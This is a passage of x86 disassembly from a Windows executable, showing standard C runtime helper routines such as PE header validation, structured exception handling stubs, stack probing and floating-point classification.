  40be07:	81 e1 00 80 00 00    	and    $0x8000,%ecx
  40be0d:	66 85 c0             	test   %ax,%ax
  40be10:	75 1e                	jne    0x40be30
  40be12:	f7 45 0c ff ff 0f 00 	testl  $0xfffff,0xc(%ebp)
  40be19:	75 06                	jne    0x40be21
  40be1b:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40be1f:	74 0f                	je     0x40be30
  40be21:	f7 d9                	neg    %ecx
  40be23:	1b c9                	sbb    %ecx,%ecx
  40be25:	83 e1 90             	and    $0xffffff90,%ecx
  40be28:	8d 81 80 00 00 00    	lea    0x80(%ecx),%eax
  40be2e:	5d                   	pop    %ebp
  40be2f:	c3                   	ret
  40be30:	dd 45 08             	fldl   0x8(%ebp)
  40be33:	d9 ee                	fldz
  40be35:	da e9                	fucompp
  40be37:	df e0                	fnstsw %ax
  40be39:	f6 c4 44             	test   $0x44,%ah
  40be3c:	7a 0c                	jp     0x40be4a
  40be3e:	f7 d9                	neg    %ecx
  40be40:	1b c9                	sbb    %ecx,%ecx
  40be42:	83 e1 e0             	and    $0xffffffe0,%ecx
  40be45:	8d 41 40             	lea    0x40(%ecx),%eax
  40be48:	5d                   	pop    %ebp
  40be49:	c3                   	ret
  40be4a:	f7 d9                	neg    %ecx
  40be4c:	1b c9                	sbb    %ecx,%ecx
  40be4e:	81 e1 08 ff ff ff    	and    $0xffffff08,%ecx
  40be54:	8d 81 00 01 00 00    	lea    0x100(%ecx),%eax
  40be5a:	5d                   	pop    %ebp
  40be5b:	c3                   	ret
  40be5c:	ff 25 4c d0 40 00    	jmp    *0x40d04c
  40be62:	cc                   	int3
  40be63:	cc                   	int3
  40be64:	cc                   	int3
  40be65:	cc                   	int3
  40be66:	cc                   	int3
  40be67:	cc                   	int3
  40be68:	cc                   	int3
  40be69:	cc                   	int3
  40be6a:	cc                   	int3
  40be6b:	cc                   	int3
  40be6c:	cc                   	int3
  40be6d:	cc                   	int3
  40be6e:	cc                   	int3
  40be6f:	cc                   	int3
  40be70:	55                   	push   %ebp
  40be71:	8b ec                	mov    %esp,%ebp
  40be73:	8b 45 08             	mov    0x8(%ebp),%eax
  40be76:	33 d2                	xor    %edx,%edx
  40be78:	53                   	push   %ebx
  40be79:	56                   	push   %esi
  40be7a:	57                   	push   %edi
  40be7b:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40be7e:	03 c8                	add    %eax,%ecx
  40be80:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40be84:	0f b7 59 06          	movzwl 0x6(%ecx),%ebx
  40be88:	83 c0 18             	add    $0x18,%eax
  40be8b:	03 c1                	add    %ecx,%eax
  40be8d:	85 db                	test   %ebx,%ebx
  40be8f:	74 1b                	je     0x40beac
  40be91:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40be94:	8b 70 0c             	mov    0xc(%eax),%esi
  40be97:	3b fe                	cmp    %esi,%edi
  40be99:	72 09                	jb     0x40bea4
  40be9b:	8b 48 08             	mov    0x8(%eax),%ecx
  40be9e:	03 ce                	add    %esi,%ecx
  40bea0:	3b f9                	cmp    %ecx,%edi
  40bea2:	72 0a                	jb     0x40beae
  40bea4:	42                   	inc    %edx
  40bea5:	83 c0 28             	add    $0x28,%eax
  40bea8:	3b d3                	cmp    %ebx,%edx
  40beaa:	72 e8                	jb     0x40be94
  40beac:	33 c0                	xor    %eax,%eax
  40beae:	5f                   	pop    %edi
  40beaf:	5e                   	pop    %esi
  40beb0:	5b                   	pop    %ebx
  40beb1:	5d                   	pop    %ebp
  40beb2:	c3                   	ret
  40beb3:	cc                   	int3
  40beb4:	cc                   	int3
  40beb5:	cc                   	int3
  40beb6:	cc                   	int3
  40beb7:	cc                   	int3
  40beb8:	cc                   	int3
  40beb9:	cc                   	int3
  40beba:	cc                   	int3
  40bebb:	cc                   	int3
  40bebc:	cc                   	int3
  40bebd:	cc                   	int3
  40bebe:	cc                   	int3
  40bebf:	cc                   	int3
  40bec0:	55                   	push   %ebp
  40bec1:	8b ec                	mov    %esp,%ebp
  40bec3:	6a fe                	push   $0xfffffffe
  40bec5:	68 a8 29 41 00       	push   $0x4129a8
  40beca:	68 e0 21 40 00       	push   $0x4021e0
  40becf:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40bed5:	50                   	push   %eax
  40bed6:	83 ec 08             	sub    $0x8,%esp
  40bed9:	53                   	push   %ebx
  40beda:	56                   	push   %esi
  40bedb:	57                   	push   %edi
  40bedc:	a1 00 40 41 00       	mov    0x414000,%eax
  40bee1:	31 45 f8             	xor    %eax,-0x8(%ebp)
  40bee4:	33 c5                	xor    %ebp,%eax
  40bee6:	50                   	push   %eax
  40bee7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40beea:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40bef0:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40bef3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40befa:	68 00 00 40 00       	push   $0x400000
  40beff:	e8 7c 00 00 00       	call   0x40bf80
  40bf04:	83 c4 04             	add    $0x4,%esp
  40bf07:	85 c0                	test   %eax,%eax
  40bf09:	74 54                	je     0x40bf5f
  40bf0b:	8b 45 08             	mov    0x8(%ebp),%eax
  40bf0e:	2d 00 00 40 00       	sub    $0x400000,%eax
  40bf13:	50                   	push   %eax
  40bf14:	68 00 00 40 00       	push   $0x400000
  40bf19:	e8 52 ff ff ff       	call   0x40be70
  40bf1e:	83 c4 08             	add    $0x8,%esp
  40bf21:	85 c0                	test   %eax,%eax
  40bf23:	74 3a                	je     0x40bf5f
  40bf25:	8b 40 24             	mov    0x24(%eax),%eax
  40bf28:	c1 e8 1f             	shr    $0x1f,%eax
  40bf2b:	f7 d0                	not    %eax
  40bf2d:	83 e0 01             	and    $0x1,%eax
  40bf30:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40bf37:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40bf3a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40bf41:	59                   	pop    %ecx
  40bf42:	5f                   	pop    %edi
  40bf43:	5e                   	pop    %esi
  40bf44:	5b                   	pop    %ebx
  40bf45:	8b e5                	mov    %ebp,%esp
  40bf47:	5d                   	pop    %ebp
  40bf48:	c3                   	ret
  40bf49:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40bf4c:	8b 00                	mov    (%eax),%eax
  40bf4e:	33 c9                	xor    %ecx,%ecx
  40bf50:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  40bf56:	0f 94 c1             	sete   %cl
  40bf59:	8b c1                	mov    %ecx,%eax
  40bf5b:	c3                   	ret
  40bf5c:	8b 65 e8             	mov    -0x18(%ebp),%esp
  40bf5f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40bf66:	33 c0                	xor    %eax,%eax
  40bf68:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40bf6b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40bf72:	59                   	pop    %ecx
  40bf73:	5f                   	pop    %edi
  40bf74:	5e                   	pop    %esi
  40bf75:	5b                   	pop    %ebx
  40bf76:	8b e5                	mov    %ebp,%esp
  40bf78:	5d                   	pop    %ebp
  40bf79:	c3                   	ret
  40bf7a:	cc                   	int3
  40bf7b:	cc                   	int3
  40bf7c:	cc                   	int3
  40bf7d:	cc                   	int3
  40bf7e:	cc                   	int3
  40bf7f:	cc                   	int3
  40bf80:	55                   	push   %ebp
  40bf81:	8b ec                	mov    %esp,%ebp
  40bf83:	8b 45 08             	mov    0x8(%ebp),%eax
  40bf86:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  40bf8b:	66 39 08             	cmp    %cx,(%eax)
  40bf8e:	75 1d                	jne    0x40bfad
  40bf90:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40bf93:	03 c8                	add    %eax,%ecx
  40bf95:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  40bf9b:	75 10                	jne    0x40bfad
  40bf9d:	ba 0b 01 00 00       	mov    $0x10b,%edx
  40bfa2:	33 c0                	xor    %eax,%eax
  40bfa4:	66 39 51 18          	cmp    %dx,0x18(%ecx)
  40bfa8:	0f 94 c0             	sete   %al
  40bfab:	5d                   	pop    %ebp
  40bfac:	c3                   	ret
  40bfad:	33 c0                	xor    %eax,%eax
  40bfaf:	5d                   	pop    %ebp
  40bfb0:	c3                   	ret
  40bfb1:	55                   	push   %ebp
  40bfb2:	8b ec                	mov    %esp,%ebp
  40bfb4:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  40bfb8:	56                   	push   %esi
  40bfb9:	8b f1                	mov    %ecx,%esi
  40bfbb:	c7 06 3c 1d 41 00    	movl   $0x411d3c,(%esi)
  40bfc1:	74 0a                	je     0x40bfcd
  40bfc3:	6a 0c                	push   $0xc
  40bfc5:	56                   	push   %esi
  40bfc6:	e8 09 00 00 00       	call   0x40bfd4
  40bfcb:	59                   	pop    %ecx
  40bfcc:	59                   	pop    %ecx
  40bfcd:	8b c6                	mov    %esi,%eax
  40bfcf:	5e                   	pop    %esi
  40bfd0:	5d                   	pop    %ebp
  40bfd1:	c2 04 00             	ret    $0x4
  40bfd4:	55                   	push   %ebp
  40bfd5:	8b ec                	mov    %esp,%ebp
  40bfd7:	ff 75 08             	push   0x8(%ebp)
  40bfda:	e8 fc 00 00 00       	call   0x40c0db
  40bfdf:	59                   	pop    %ecx
  40bfe0:	5d                   	pop    %ebp
  40bfe1:	c3                   	ret
  40bfe2:	50                   	push   %eax
  40bfe3:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40bfea:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40bfee:	2b 64 24 0c          	sub    0xc(%esp),%esp
  40bff2:	53                   	push   %ebx
  40bff3:	56                   	push   %esi
  40bff4:	57                   	push   %edi
  40bff5:	89 28                	mov    %ebp,(%eax)
  40bff7:	8b e8                	mov    %eax,%ebp
  40bff9:	a1 00 40 41 00       	mov    0x414000,%eax
  40bffe:	33 c5                	xor    %ebp,%eax
  40c000:	50                   	push   %eax
  40c001:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40c004:	ff 75 fc             	push   -0x4(%ebp)
  40c007:	c7 45 fc ff ff ff ff 	movl   $0xffffffff,-0x4(%ebp)
  40c00e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40c011:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40c017:	c3                   	ret
  40c018:	cc                   	int3
  40c019:	cc                   	int3
  40c01a:	cc                   	int3
  40c01b:	cc                   	int3
  40c01c:	cc                   	int3
  40c01d:	cc                   	int3
  40c01e:	cc                   	int3
  40c01f:	cc                   	int3
  40c020:	68 e0 21 40 00       	push   $0x4021e0
  40c025:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40c02c:	8b 44 24 10          	mov    0x10(%esp),%eax
  40c030:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  40c034:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  40c038:	2b e0                	sub    %eax,%esp
  40c03a:	53                   	push   %ebx
  40c03b:	56                   	push   %esi
  40c03c:	57                   	push   %edi
  40c03d:	a1 00 40 41 00       	mov    0x414000,%eax
  40c042:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40c045:	33 c5                	xor    %ebp,%eax
  40c047:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40c04a:	50                   	push   %eax
  40c04b:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40c04e:	ff 75 f8             	push   -0x8(%ebp)
  40c051:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c054:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40c05b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40c05e:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40c061:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40c067:	c3                   	ret
  40c068:	cc                   	int3
  40c069:	cc                   	int3
  40c06a:	cc                   	int3
  40c06b:	cc                   	int3
  40c06c:	cc                   	int3
  40c06d:	cc                   	int3
  40c06e:	cc                   	int3
  40c06f:	cc                   	int3
  40c070:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40c073:	33 cd                	xor    %ebp,%ecx
  40c075:	e8 e4 51 ff ff       	call   0x40125e
  40c07a:	e9 71 5b ff ff       	jmp    0x401bf0
  40c07f:	cc                   	int3
  40c080:	51                   	push   %ecx
  40c081:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40c085:	2b c8                	sub    %eax,%ecx
  40c087:	83 e1 0f             	and    $0xf,%ecx
  40c08a:	03 c1                	add    %ecx,%eax
  40c08c:	1b c9                	sbb    %ecx,%ecx
  40c08e:	0b c1                	or     %ecx,%eax
  40c090:	59                   	pop    %ecx
  40c091:	e9 1a 00 00 00       	jmp    0x40c0b0
  40c096:	51                   	push   %ecx
  40c097:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  40c09b:	2b c8                	sub    %eax,%ecx
  40c09d:	83 e1 07             	and    $0x7,%ecx
  40c0a0:	03 c1                	add    %ecx,%eax
  40c0a2:	1b c9                	sbb    %ecx,%ecx
  40c0a4:	0b c1                	or     %ecx,%eax
  40c0a6:	59                   	pop    %ecx
  40c0a7:	e9 04 00 00 00       	jmp    0x40c0b0
  40c0ac:	cc                   	int3
  40c0ad:	cc                   	int3
  40c0ae:	cc                   	int3
  40c0af:	cc                   	int3
  40c0b0:	51                   	push   %ecx
  40c0b1:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  40c0b5:	2b c8                	sub    %eax,%ecx
  40c0b7:	1b c0                	sbb    %eax,%eax
  40c0b9:	f7 d0                	not    %eax
  40c0bb:	23 c8                	and    %eax,%ecx
  40c0bd:	8b c4                	mov    %esp,%eax
  40c0bf:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  40c0c4:	3b c8                	cmp    %eax,%ecx
  40c0c6:	72 0a                	jb     0x40c0d2
  40c0c8:	8b c1                	mov    %ecx,%eax
  40c0ca:	59                   	pop    %ecx
  40c0cb:	94                   	xchg   %eax,%esp
  40c0cc:	8b 00                	mov    (%eax),%eax
  40c0ce:	89 04 24             	mov    %eax,(%esp)
  40c0d1:	c3                   	ret
  40c0d2:	2d 00 10 00 00       	sub    $0x1000,%eax
  40c0d7:	85 00                	test   %eax,(%eax)
  40c0d9:	eb e9                	jmp    0x40c0c4
  40c0db:	e9 28 92 ff ff       	jmp    0x405308
  40c0e0:	55                   	push   %ebp
  40c0e1:	8b ec                	mov    %esp,%ebp
  40c0e3:	51                   	push   %ecx
  40c0e4:	83 3d 34 4b 41 00 01 	cmpl   $0x1,0x414b34
  40c0eb:	7c 66                	jl     0x40c153
  40c0ed:	81 7d 08 b4 02 00 c0 	cmpl   $0xc00002b4,0x8(%ebp)
  40c0f4:	74 09                	je     0x40c0ff
  40c0f6:	81 7d 08 b5 02 00 c0 	cmpl   $0xc00002b5,0x8(%ebp)
  40c0fd:	75 54                	jne    0x40c153
  40c0ff:	0f ae 5d fc          	stmxcsr -0x4(%ebp)
  40c103:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c106:	83 f0 3f             	xor    $0x3f,%eax
  40c109:	a8 81                	test   $0x81,%al
  40c10b:	74 3f                	je     0x40c14c
  40c10d:	a9 04 02 00 00       	test   $0x204,%eax
  40c112:	75 07                	jne    0x40c11b
  40c114:	b8 8e 00 00 c0       	mov    $0xc000008e,%eax
  40c119:	c9                   	leave
  40c11a:	c3                   	ret
  40c11b:	a9 02 01 00 00       	test   $0x102,%eax
  40c120:	74 2a                	je     0x40c14c
  40c122:	a9 08 04 00 00       	test   $0x408,%eax
  40c127:	75 07                	jne    0x40c130
  40c129:	b8 91 00 00 c0       	mov    $0xc0000091,%eax
  40c12e:	c9                   	leave
  40c12f:	c3                   	ret
  40c130:	a9 10 08 00 00       	test   $0x810,%eax
  40c135:	75 07                	jne    0x40c13e
  40c137:	b8 93 00 00 c0       	mov    $0xc0000093,%eax
  40c13c:	c9                   	leave
  40c13d:	c3                   	ret
  40c13e:	a9 20 10 00 00       	test   $0x1020,%eax
  40c143:	75 0e                	jne    0x40c153
  40c145:	b8 8f 00 00 c0       	mov    $0xc000008f,%eax
  40c14a:	c9                   	leave
  40c14b:	c3                   	ret
  40c14c:	b8 90 00 00 c0       	mov    $0xc0000090,%eax
  40c151:	c9                   	leave
  40c152:	c3                   	ret
  40c153:	8b 45 08             	mov    0x8(%ebp),%eax
  40c156:	c9                   	leave
  40c157:	c3                   	ret
  40c158:	cc                   	int3
  40c159:	cc                   	int3
  40c15a:	cc                   	int3
  40c15b:	cc                   	int3
  40c15c:	cc                   	int3
  40c15d:	cc                   	int3
  40c15e:	cc                   	int3
  40c15f:	cc                   	int3
  40c160:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40c163:	e9 98 4e ff ff       	jmp    0x401000
  40c168:	8d 4d c8             	lea    -0x38(%ebp),%ecx
  40c16b:	e9 90 4e ff ff       	jmp    0x401000
  40c170:	cc                   	int3
  40c171:	cc                   	int3
  40c172:	cc                   	int3
  40c173:	cc                   	int3
  40c174:	cc                   	int3
  40c175:	90                   	nop
  40c176:	90                   	nop
  40c177:	8b 54 24 08          	mov    0x8(%esp),%edx
  40c17b:	8d 42 0c             	lea    0xc(%edx),%eax
  40c17e:	8b 4a b8             	mov    -0x48(%edx),%ecx
  40c181:	33 c8                	xor    %eax,%ecx
  40c183:	e8 d6 50 ff ff       	call   0x40125e
  40c188:	b8 d8 24 41 00       	mov    $0x4124d8,%eax
  40c18d:	e9 d5 5f ff ff       	jmp    0x402167
  40c192:	90                   	nop
  40c193:	90                   	nop
  40c194:	8b 54 24 08          	mov    0x8(%esp),%edx
  40c198:	8d 42 0c             	lea    0xc(%edx),%eax
  40c19b:	8b 4a ec             	mov    -0x14(%edx),%ecx
  40c19e:	33 c8                	xor    %eax,%ecx
  40c1a0:	e8 b9 50 ff ff       	call   0x40125e
  40c1a5:	b8 e4 25 41 00       	mov    $0x4125e4,%eax
  40c1aa:	e9 b8 5f ff ff       	jmp    0x402167
